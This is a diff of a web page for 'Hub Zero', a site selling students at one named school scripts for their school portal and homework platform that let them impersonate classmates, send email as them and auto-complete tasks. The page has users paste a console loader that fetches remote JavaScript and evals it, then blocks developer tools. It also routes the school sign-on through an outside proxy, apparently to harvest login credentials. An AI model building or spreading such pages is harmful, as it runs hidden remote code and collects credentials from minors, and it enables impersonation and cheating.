+    </span>
   </div>
 </nav>
 
 <section class="hero">
-  <div class="hero-top"></div>
-  
-  <div class="hero-title-wrap">
-    <h1 class="hero-title">
-      <span class="line"><span>HUB</span></span>
-      <span class="line"><span>ZERO<em>.</em></span></span>
-    </h1>
+  <div class="hero-content">
+    <div class="hero-title-wrap">
+      <h1 class="hero-title">
+        <span class="line"><span>HUB</span></span>
+        <span class="line"><span>ZERO<em>.</em></span></span>
+      </h1>
+    </div>
+
+    <!-- Logged In Welcome Message -->
+    <div id="logged-in-welcome" class="welcome-box fade-up d1" style="display: none;">
+      <h2 class="welcome-title">Glad you could make it, <span id="welcome-username" class="highlight-green">User</span>.</h2>
+      <div class="welcome-actions">
+        <button class="btn btn-green" id="btn-relink-realm">Relink Realm</button>
+        <button class="btn btn-red" id="btn-logout-dashboard">Logout</button>
+      </div>
+    </div>
   </div>
   
   <div class="hero-arrow fade-up d2">
@@ -932,55 +918,104 @@
   </div>
 </div>
 
-<section class="services" id="services">
-  <div class="services-header">
-    <h2 class="services-title fade-up"><em>Viewing</em>.</h2>
-  </div>
-  
-  <div class="services-grid">
-    <div class="services-item fade-up">
-      <div class="services-item-info">
-        <div class="services-item-num">01</div>
-        <div class="services-item-name">EP-Hub.png</div>
-      </div>
-      <img src="EP-Hub.png" alt="EP Hub" loading="lazy">
+<!-- Non-Logged In Sections Wrapper -->
+<div id="non-logged-sections">
+  <!-- About Section -->
+  <section class="about-section" id="about">
+    <div class="about-header fade-up">
+      <h2 class="services-title">What is <em>Hub Zero?</em></h2>
     </div>
-    <div class="services-item fade-up d1">
-      <div class="services-item-info">
-        <div class="services-item-num">02</div>
-        <div class="services-item-name">Realm-Search.png</div>
+    <div class="about-content fade-up d1">
+      <p class="about-desc">
+        We are Hub Zero! We spend time crafting the perfect and most useful scripts for the websites you use at school. Currently we might be able to interest you in the following scripts:
+      </p>
+      
+      <div class="scripts-showcase">
+        <div class="script-card">
+          <h3 class="script-card-title">Student Searcher <span class="highlight-green">(on realm)</span></h3>
+          <p class="script-card-desc">
+            Browse any student in the entire school. Impersonate them on your realm homepage. Send them an email from realm. Browse through each year level + MORE FEATURES TO COME AT USER SUGGESTION
+          </p>
+        </div>
+        
+        <div class="script-card">
+          <h3 class="script-card-title">Education Perfect Script Hub</h3>
+          <p class="script-card-desc">
+            Complete any task. Give or set your cheer credits. Check and send cheers easily without needing to complete a task or scroll the leaderboard. Auto information slides + MORE TO COME
+          </p>
+        </div>
       </div>
-      <img src="Realm-Search.png" alt="Realm Search" loading="lazy">
     </div>
-    <div class="services-item fade-up d2">
-      <div class="services-item-info">
-        <div class="services-item-num">03</div>
-        <div class="services-item-name">Realm-Yeargroup.png</div>
+  </section>
+
+  <!-- Gallery Section -->
+  <section class="gallery-section" id="gallery">
+    <div class="gallery-header fade-up">
+      <h2 class="services-title">Gallery</h2>
+      <p class="gallery-subtitle">View our scripts in action!</p>
+    </div>
+    
+    <div class="gallery-grid fade-up d1">
+      <div class="gallery-item">
+        <img src="EP-Hub.png" alt="EP Hub" loading="lazy">
+        <div class="gallery-caption">EP Hub Interface</div>
       </div>
-      <img src="Realm-Yeargroup.png" alt="Realm Yeargroup" loading="lazy">
-    </div>
-    <div class="services-item fade-up d3">
-      <div class="services-item-info">
-        <div class="services-item-num">04</div>
-        <div class="services-item-name">Realm-Student-Profile.png</div>
+      <div class="gallery-item">
+        <img src="Realm-Search.png" alt="Realm Search" loading="lazy">
+        <div class="gallery-caption">Realm Student Search</div>
       </div>
-      <img src="Realm-Student-Profile.png" alt="Realm Student Profile" loading="lazy">
+      <div class="gallery-item">
+        <img src="Realm-Yeargroup.png" alt="Realm Yeargroup" loading="lazy">
+        <div class="gallery-caption">Realm Yeargroup Browser</div>
+      </div>
+      <div class="gallery-item">
+        <img src="Realm-Student-Profile.png" alt="Realm Student Profile" loading="lazy">
+        <div class="gallery-caption">Realm Detailed Student Profile</div>
+      </div>
     </div>
-  </div>
-</section>
+  </section>
 
+  <!-- Get Scripts Section -->
+  <section class="get-scripts-section" id="get-scripts">
+    <div class="get-scripts-header fade-up">
+      <h2 class="services-title">Get <em>Scripts</em>.</h2>
+      <p class="get-scripts-subtitle">Ready to get started?</p>
+    </div>
+    <div class="fade-up d1" style="display: flex; justify-content: center; margin-top: 30px;">
+      <button class="btn btn-green btn-large" id="btn-get-loader">Get script loader</button>
+    </div>
+  </section>
+</div>
 
-<section class="scripts-loader" id="scripts-loader">
-  <div class="scripts-loader-header">
-    <h2 class="services-title fade-up"><em>Scripts</em> Loader.</h2>
-  </div>
-  <div class="loader-box-container fade-up d1">
-    <input type="text" class="loader-box-input" readonly value="javascript:fetch('https://hub-zero.site/loader.js').then(r=>r.text()).then(eval)">
-    <button class="loader-box-btn" id="btn-copy-loader">Copy Code</button>
-  </div>
-</section>
+<!-- Logged In Section Wrapper -->
+<div id="logged-sections" style="display: none;">
+  <section class="scripts-loader" id="scripts-dashboard">
+    <div class="scripts-loader-header">
+      <h2 class="services-title"><em>Scripts</em> Loader.</h2>
+    </div>
+    <div class="loader-box-container">
+      <input type="text" class="loader-box-input" id="loader-code-input" readonly value="javascript:fetch('https://hub-zero.site/loader.js').then(r=>r.text()).then(eval)">
+      <button class="loader-box-btn" id="btn-copy-loader">Copy Code</button>
+    </div>
+    
+    <div class="how-to-use-wrapper">
+      <button class="how-to-toggle" id="btn-how-to-toggle">
+        How to use this?
+        <span class="toggle-arrow">▼</span>
+      </button>
+      <div class="how-to-content" id="how-to-use-content">
+        <h4>USING THE SCRIPT:</h4>
+        <ol>
+          <li>You will run the developer tools on Realm or EP by pressing <strong>CTRL + SHIFT + J</strong> on your keyboard.</li>
+          <li>You will paste the loader script into the console and execute it.</li>
+          <li><strong>YOU WILL NOT BE ABLE TO ACCESS DEVELOPER TOOLS ONCE THE SCRIPT HAS BEEN EXECUTED.</strong></li>
+        </ol>
+      </div>
+    </div>
+  </section>
+</div>
 
-
+<!-- Footer -->
 <footer>
   <h2 class="footer-logo fade-up"><span>HUB</span> <em>ZERO</em>.</h2>
   <div class="footer-bottom fade-up d1">
@@ -989,8 +1024,107 @@
   </div>
 </footer>
 
+<!-- Setup and Redirection Modal Overlay -->
+<div class="modal-overlay" id="modal-overlay">
+  <div class="modal-box setup-modal-box">
+    <!-- Edge Browser Warning -->
+    <div class="modal-step" id="modal-step-edge" style="display: none;">
+      <h3 class="modal-title highlight-red">Edge Required</h3>
+      <p class="modal-text">This platform can only be accessed using <strong>Microsoft Edge</strong> to ensure script compatibility.</p>
+      <p class="modal-text info">Please copy this link and open it in Edge.</p>
+      <div class="modal-footer-warning">Unsupported Browser</div>
+      <div class="modal-buttons">
+        <button class="btn btn-red" id="btn-edge-close">Close</button>
+      </div>
+    </div>
+
+    <!-- Multi-Checkbox Setup Steps -->
+    <div class="modal-step" id="modal-step-setup" style="display: none;">
+      <h3 class="modal-title highlight">Setting up - MUST READ</h3>
+      <p class="modal-text-intro">Getting the script loader and using it is very simple. Below we will outline everything:</p>
+      
+      <div class="setup-scroll-container">
+        <!-- Section 1 -->
+        <div class="setup-section">
+          <h4 class="setup-section-title">GETTING THE SCRIPT</h4>
+          <ol class="setup-list">
+            <li>Pressing continue will redirect you to log in <strong>WITH REALM</strong>.</li>
+            <li>After you have logged in, you will be considered verified and added to our system.</li>
+            <li>That's it. You will have access to Hub Zero's EP and Realm scripts forever.</li>
+          </ol>
+          <label class="setup-checkbox-label">
+            <input type="checkbox" class="setup-checkbox" id="chk-setup-1">
+            <span>I have read the Getting the Script section</span>
+          </label>
+        </div>
+
+        <!-- Section 2 -->
+        <div class="setup-section">
+          <h4 class="setup-section-title">USING THE SCRIPT</h4>
+          <ol class="setup-list">
+            <li>You will run the developer tools on Realm or EP by pressing <strong>CTRL + SHIFT + J</strong> on your keyboard.</li>
+            <li>You will paste the loader script into the console and execute it.</li>
+            <li><strong>YOU WILL NOT BE ABLE TO ACCESS DEVELOPER TOOLS ONCE THE SCRIPT HAS BEEN EXECUTED.</strong></li>
+          </ol>
+          <label class="setup-checkbox-label">
+            <input type="checkbox" class="setup-checkbox" id="chk-setup-2">
+            <span>I have read the Using the Script section</span>
+          </label>
+        </div>
+
+        <!-- Section 3 -->
+        <div class="setup-section">
+          <h4 class="setup-section-title">GETTING HELP</h4>
+          <p class="setup-desc-text">If you need help getting set up there will be additional information once you have logged in.</p>
+          <label class="setup-checkbox-label">
+            <input type="checkbox" class="setup-checkbox" id="chk-setup-3">
+            <span>I have read the Getting Help section</span>
+          </label>
+        </div>
+
+        <!-- Warning Block -->
+        <div class="setup-warning-block">
+          ATTEMPTING TO REVERSE ENGINEER OUR SCRIPTS WILL ALERT US AND YOU WILL BE BLACKLISTED. TEACHER ACCOUNTS WILL BE BLACKLISTED.
+        </div>
+
+        <!-- Final section -->
+        <div class="setup-section final-section">
+          <label class="setup-checkbox-label final-label">
+            <input type="checkbox" class="setup-checkbox" id="chk-setup-final">
+            <strong>I have read ALL the above information and understand it</strong>
+          </label>
+        </div>
+      </div>
+
+      <div class="modal-buttons" style="margin-top: 24px;">
+        <button class="btn btn-red" id="btn-setup-cancel">Cancel</button>
+        <button class="btn btn-green" id="btn-setup-continue" disabled>Continue</button>
+      </div>
+    </div>
+
+    <!-- Step 2: Confirmation Redirection -->
+    <div class="modal-step" id="modal-step-redirect" style="display: none;">
+      <h3 class="modal-title highlight">Redirecting</h3>
+      <div class="modal-info-box">
+        <span class="modal-info-box-title">Log in with Realm</span>
+        <p class="modal-text">Great! You will now need to login to add your name to the system :). Note: If you are NOT from St patricks college shorncliffe you will NOT have access to our scripts or this site. P.S teacher accounts do NOT work</p>
+      </div>
+      <p class="modal-text warning">Read above before going to realm sign on</p>
+      <div class="modal-buttons">
+        <button class="btn btn-green" id="btn-setup-okay">OKAY</button>
+      </div>
+    </div>
+  </div>
+</div>
+
 <script>
- 
+  const isEdge = /Edg/i.test(navigator.userAgent);
+  const overlay = document.getElementById('modal-overlay');
+  const stepEdge = document.getElementById('modal-step-edge');
+  const stepSetup = document.getElementById('modal-step-setup');
+  const stepRedirect = document.getElementById('modal-step-redirect');
+
+  // Verify and load user view states
   (async function() {
     const signedIn = localStorage.getItem('Signed_in');
     if (signedIn) {
@@ -1000,7 +1134,7 @@
         if (id) {
           const sbKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imlub2xmdmpwaWt0bXJocXl2bnNoIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODQ5MjU5NDUsImV4cCI6MjEwMDUwMTk0NX0.gurNKy0vtMfVMW-To_2kyvMpQhEPpq7bKkJnyNN2qAc';
           
-         
+          // Check blacklist
           const blacklistRes = await fetch('https://inolfvjpiktmrhqyvnsh.supabase.co/rest/v1/blacklisted_students?id=eq.' + encodeURIComponent(id), {
             headers: { 'apikey': sbKey, 'Authorization': 'Bearer ' + sbKey }
           });
@@ -1014,7 +1148,7 @@
             }
           }
 
-         
+          // Check registration
           const res = await fetch('https://inolfvjpiktmrhqyvnsh.supabase.co/rest/v1/verified_students?id=eq.' + encodeURIComponent(id), {
             headers: {
               'apikey': sbKey,
@@ -1027,8 +1161,17 @@
               localStorage.removeItem('Signed_in');
               alert("Account error. Please log in again");
               window.location.reload();
+              return;
             }
           }
+          
+          // Setup logged in DOM state
+          document.getElementById('nav-non-logged-links').style.display = 'none';
+          document.getElementById('nav-logged-links').style.display = 'block';
+          document.getElementById('non-logged-sections').style.display = 'none';
+          document.getElementById('logged-sections').style.display = 'block';
+          document.getElementById('logged-in-welcome').style.display = 'block';
+          document.getElementById('welcome-username').textContent = data.name;
         }
       } catch (e) {
         console.error("Session verification error:", e);
@@ -1036,94 +1179,7 @@
     }
   })();
 
- 
-  const copyBtn = document.getElementById('btn-copy-loader');
-  if (copyBtn) {
-    copyBtn.addEventListener('click', () => {
-      const input = document.querySelector('.loader-box-input');
-      input.select();
-      document.execCommand('copy');
-      
-      const originalText = copyBtn.textContent;
-      copyBtn.textContent = 'Copied!';
-      copyBtn.style.background = '#22c55e';
-      copyBtn.style.borderColor = '#22c55e';
-      copyBtn.style.color = '#ffffff';
-      setTimeout(() => {
-        copyBtn.textContent = originalText;
-        copyBtn.style.background = '';
-        copyBtn.style.borderColor = '';
-        copyBtn.style.color = '';
-      }, 1500);
-    });
-  }
-
- 
-  const progress = document.getElementById('progress');
-  function updateProgress() {
-    const scrollPercent = (window.scrollY / (document.body.scrollHeight - window.innerHeight)) * 100;
-    progress.style.width = Math.min(scrollPercent, 100) + '%';
-  }
-  window.addEventListener('scroll', updateProgress, { passive: true });
-  updateProgress();
-
- 
-  const fadeObserver = new IntersectionObserver((entries) => {
-    entries.forEach(entry => {
-      if (entry.isIntersecting) {
-        entry.target.classList.add('in');
-        fadeObserver.unobserve(entry.target);
-      }
-    });
-  }, { threshold: 0.15, rootMargin: '0px 0px -60px 0px' });
-  document.querySelectorAll('.fade-up').forEach(el => fadeObserver.observe(el));
-
- 
-  const isEdge = /Edg/i.test(navigator.userAgent);
-
- 
-  const overlay = document.getElementById('modal-overlay');
-  const step1 = document.getElementById('modal-step-1');
-  const step2 = document.getElementById('modal-step-2');
-  const btnNo = document.getElementById('btn-no');
-  const btnYes = document.getElementById('btn-yes');
-  const btnOkay = document.getElementById('btn-okay');
-
-  btnNo.addEventListener('click', () => {
-    window.location.href = 'https://google.com';
-  });
-
-  btnYes.addEventListener('click', () => {
-    step1.style.display = 'none';
-    step2.style.display = 'flex';
-  });
-
-  const demoBtn = document.getElementById('btn-show-demo');
-  const lightbox = document.getElementById('gallery-lightbox');
-  if (demoBtn && lightbox) {
-    demoBtn.addEventListener('click', (e) => {
-      e.preventDefault();
-      lightbox.style.display = 'flex';
-    });
-    lightbox.addEventListener('click', (e) => {
-      if (e.target === lightbox || e.target.classList.contains('lightbox-content')) {
-        lightbox.style.display = 'none';
-      }
-    });
-  }
-
-  btnOkay.addEventListener('click', () => {
-   
-    overlay.style.backgroundColor = '#000000';
-    overlay.style.opacity = '1';
-    const modalBox = document.querySelector('.modal-box');
-    if (modalBox) modalBox.style.display = 'none';
-    
-   
-    window.location.href = 'http://residential-6k3h.onrender.com/proxy?url=https://realm.stpatricks.qld.edu.au/';
-  });
-
- 
+  // Handle URL redirect verification queries
   const urlParams = new URLSearchParams(window.location.search);
   if (urlParams.get('verified') === 'true') {
     const name = urlParams.get('name') || '';
@@ -1133,7 +1189,7 @@
       try {
         const sbKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imlub2xmdmpwaWt0bXJocXl2bnNoIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODQ5MjU5NDUsImV4cCI6MjEwMDUwMTk0NX0.gurNKy0vtMfVMW-To_2kyvMpQhEPpq7bKkJnyNN2qAc';
         
-       
+        // Verify blacklist before logging in
         const blacklistRes = await fetch('https://inolfvjpiktmrhqyvnsh.supabase.co/rest/v1/blacklisted_students?id=eq.' + encodeURIComponent(id), {
           headers: { 'apikey': sbKey, 'Authorization': 'Bearer ' + sbKey }
         });
@@ -1141,17 +1197,16 @@
           const blacklistRecords = await blacklistRes.json();
           if (blacklistRecords && blacklistRecords.length > 0) {
             alert("Access Denied: You are blacklisted. Reason: " + blacklistRecords[0].reason);
-           
             const newUrl = window.location.pathname;
             window.history.replaceState({}, document.title, newUrl);
             return;
           }
         }
 
-       
+        // Save sign-in state
         localStorage.setItem('Signed_in', JSON.stringify({ name: name, id: id }));
 
-       
+        // Upsert limits profile
         const sbUrl = 'https://inolfvjpiktmrhqyvnsh.supabase.co/rest/v1/student_usage_limits';
         const checkRes = await fetch(sbUrl + '?id=eq.' + encodeURIComponent(id), {
           headers: { 'apikey': sbKey, 'Authorization': 'Bearer ' + sbKey }
@@ -1176,11 +1231,9 @@
         }
         
         alert("Verified ✔");
-        
-       
         const newUrl = window.location.pathname;
         window.history.replaceState({}, document.title, newUrl);
-        updateHeroTop();
+        window.location.reload();
 
       } catch (err) {
         console.error("Verification callback processing failed:", err);
@@ -1188,68 +1241,156 @@
     })();
   }
 
- 
-  function updateHeroTop() {
-    const signedIn = localStorage.getItem('Signed_in');
-    const heroTop = document.querySelector('.hero-top');
-    if (signedIn) {
-      try {
-        const data = JSON.parse(signedIn);
-        heroTop.innerHTML = `
-          <div class="hero-top-welcome">Welcome ${data.name}</div>
-          <div class="hero-top-actions">
-            <button class="hero-top-btn btn-relink" id="btn-relink-realm">Relink Realm</button>
-            <button class="hero-top-btn btn-logout" id="btn-logout">Logout</button>
-          </div>
-        `;
-        
-        document.getElementById('btn-relink-realm').addEventListener('click', () => {
-          window.location.href = 'http://residential-6k3h.onrender.com/proxy?url=https://realm.stpatricks.qld.edu.au/';
-        });
-        
-        document.getElementById('btn-logout').addEventListener('click', () => {
-          localStorage.removeItem('Signed_in');
-          window.location.reload();
-        });
-      } catch (e) {
-        heroTop.innerHTML = `Welcome User`;
+  // Copy code box
+  const copyBtn = document.getElementById('btn-copy-loader');
+  if (copyBtn) {
+    copyBtn.addEventListener('click', () => {
+      const input = document.getElementById('loader-code-input');
+      input.select();
+      document.execCommand('copy');
+      
+      const originalText = copyBtn.textContent;
+      copyBtn.textContent = 'Copied!';
+      copyBtn.style.background = '#22c55e';
+      copyBtn.style.borderColor = '#22c55e';
+      copyBtn.style.color = '#ffffff';
+      setTimeout(() => {
+        copyBtn.textContent = originalText;
+        copyBtn.style.background = '';
+        copyBtn.style.borderColor = '';
+        copyBtn.style.color = '';
+      }, 1500);
+    });
+  }
+
+  // Dashboard Toggle Actions
+  const howToToggle = document.getElementById('btn-how-to-toggle');
+  const howToContent = document.getElementById('how-to-use-content');
+  if (howToToggle && howToContent) {
+    howToToggle.addEventListener('click', () => {
+      const isActive = howToToggle.classList.toggle('active');
+      if (isActive) {
+        howToContent.classList.add('active');
+      } else {
+        howToContent.classList.remove('active');
       }
+    });
+  }
+
+  // Relink and Logout button actions
+  const relinkBtn = document.getElementById('btn-relink-realm');
+  if (relinkBtn) {
+    relinkBtn.addEventListener('click', () => {
+      window.location.href = 'http://residential-6k3h.onrender.com/proxy?url=https://realm.stpatricks.qld.edu.au/';
+    });
+  }
+  const logoutBtn = document.getElementById('btn-logout-dashboard');
+  if (logoutBtn) {
+    logoutBtn.addEventListener('click', () => {
+      localStorage.removeItem('Signed_in');
+      window.location.reload();
+    });
+  }
+
+  // Scroll reveal loader progress and intersection fade-ups
+  const progress = document.getElementById('progress');
+  function updateProgress() {
+    const scrollPercent = (window.scrollY / (document.body.scrollHeight - window.innerHeight)) * 100;
+    progress.style.width = Math.min(scrollPercent, 100) + '%';
+  }
+  window.addEventListener('scroll', updateProgress, { passive: true });
+  updateProgress();
+
+  const fadeObserver = new IntersectionObserver((entries) => {
+    entries.forEach(entry => {
+      if (entry.isIntersecting) {
+        entry.target.classList.add('in');
+        fadeObserver.unobserve(entry.target);
+      }
+    });
+  }, { threshold: 0.15, rootMargin: '0px 0px -40px 0px' });
+  document.querySelectorAll('.fade-up').forEach(el => fadeObserver.observe(el));
+
+  // Multi-Checkbox modal validate logic
+  const chk1 = document.getElementById('chk-setup-1');
+  const chk2 = document.getElementById('chk-setup-2');
+  const chk3 = document.getElementById('chk-setup-3');
+  const chkFinal = document.getElementById('chk-setup-final');
+  const btnContinue = document.getElementById('btn-setup-continue');
+  const btnCancel = document.getElementById('btn-setup-cancel');
+  const btnGetLoader = document.getElementById('btn-get-loader');
+
+  function validateCheckboxes() {
+    if (chk1.checked && chk2.checked && chk3.checked && chkFinal.checked) {
+      btnContinue.disabled = false;
     } else {
-      heroTop.innerHTML = '';
-    }
-  }
-  updateHeroTop();
-
-  function checkModalState() {
-    if (!isEdge) {
-      step1.style.display = 'none';
-      step2.style.display = 'none';
-      document.getElementById('modal-step-edge').style.display = 'flex';
-      document.body.classList.add('modal-open');
-      overlay.classList.add('active');
-    } else if (!localStorage.getItem('Signed_in')) {
-      step1.style.display = 'flex';
-      step2.style.display = 'none';
-      document.body.classList.add('modal-open');
-      overlay.classList.add('active');
+      btnContinue.disabled = true;
     }
   }
 
- 
+  [chk1, chk2, chk3, chkFinal].forEach(chk => {
+    if (chk) {
+      chk.addEventListener('change', validateCheckboxes);
+    }
+  });
+
+  if (btnGetLoader) {
+    btnGetLoader.addEventListener('click', () => {
+      document.body.classList.add('modal-open');
+      overlay.classList.add('active');
+      
+      if (!isEdge) {
+        stepSetup.style.display = 'none';
+        stepRedirect.style.display = 'none';
+        stepEdge.style.display = 'flex';
+      } else {
+        stepSetup.style.display = 'flex';
+        stepRedirect.style.display = 'none';
+        stepEdge.style.display = 'none';
+      }
+    });
+  }
+
+  if (btnCancel) {
+    btnCancel.addEventListener('click', () => {
+      overlay.classList.remove('active');
+      document.body.classList.remove('modal-open');
+      [chk1, chk2, chk3, chkFinal].forEach(c => c.checked = false);
+      btnContinue.disabled = true;
+    });
+  }
+
+  const btnEdgeClose = document.getElementById('btn-edge-close');
+  if (btnEdgeClose) {
+    btnEdgeClose.addEventListener('click', () => {
+      overlay.classList.remove('active');
+      document.body.classList.remove('modal-open');
+    });
+  }
+
+  if (btnContinue) {
+    btnContinue.addEventListener('click', () => {
+      stepSetup.style.display = 'none';
+      stepRedirect.style.display = 'flex';
+    });
+  }
+
+  const btnOkay = document.getElementById('btn-setup-okay');
+  if (btnOkay) {
+    btnOkay.addEventListener('click', () => {
+      overlay.style.backgroundColor = '#000000';
+      overlay.style.opacity = '1';
+      const modalBox = document.querySelector('.modal-box');
+      if (modalBox) modalBox.style.display = 'none';
+      window.location.href = 'http://residential-6k3h.onrender.com/proxy?url=https://realm.stpatricks.qld.edu.au/';
+    });
+  }
+
   window.addEventListener('load', () => {
     setTimeout(() => {
       document.getElementById('loader').classList.add('loaded');
       document.body.classList.add('loaded');
-    }, 700);
-  });
-
- 
-  window.addEventListener('pageshow', (event) => {
-    if (event.persisted) {
-      checkModalState();
-    } else {
-      setTimeout(checkModalState, 1300);
-    }
+    }, 500);
   });
 </script>
 
